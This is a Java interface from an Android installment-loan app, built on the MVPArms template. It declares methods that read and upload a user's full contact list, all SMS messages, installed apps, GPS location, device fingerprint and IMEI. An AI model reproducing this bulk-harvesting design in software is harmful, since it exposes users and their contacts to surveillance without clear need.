package com.yinduowang.installment.mvp.contract;

import com.jess.arms.mvp.IModel;
import com.jess.arms.mvp.IView;
import com.yinduowang.installment.mvp.model.entity.AppVersionEntity;
import com.yinduowang.installment.mvp.model.entity.BaseResponse;

import java.util.Map;

import io.reactivex.Observable;


/**
 * ================================================
 * Description:
 * <p>
 * Created by MVPArmsTemplate on 03/14/2019 00:33
 * <a href="mailto:jess.yan.effort@gmail.com">Contact me</a>
 * <a href="https://github.com/JessYanCoding">Follow me</a>
 * <a href="https://github.com/JessYanCoding/MVPArms">Star me</a>
 * <a href="https://github.com/JessYanCoding/MVPArms/wiki">See me</a>
 * <a href="https://github.com/JessYanCoding/MVPArmsTemplate">模版请保持更新</a>
 * ================================================
 */
public interface UploadUserInfoContract {
    //对于经常使用的关于UI的方法可以定义到IView中,如显示隐藏进度条,和显示文字消息
    interface View extends IView {

    }

    //Model层定义接口,外部只需关心Model返回的数据,无需关心内部细节,即是否使用缓存
    interface Model extends IModel {
        // 上传所有联系人
        Observable<BaseResponse> uploadAddressBookToServer(String info);

        // 上传所有短信
        Observable<BaseResponse> updataAllSms(String info);

        // 上传所有联系人
        Observable<BaseResponse> updataAllAppList(String info);

        // 上传GPS
        Observable<BaseResponse> updataAllGPS(Map<String, String> map);

        // 获取所有联系人
        String getAllContactInfo();

        // 获取所有联系人
        String getAllMsm();

        // 获取安装APP列表
        String getAllAppList();

        // 设备指纹上传
        Observable<BaseResponse> saveFingerprint(String fingerToken);

        // 上传页面统计
        Observable<BaseResponse> updataPage(String pageName, String imei);

        // 上传错误信息
        Observable<BaseResponse> updataError(String errorInfo);

        // 检查是否需要升级
        Observable<BaseResponse<AppVersionEntity>> checkVersion();
    }
}
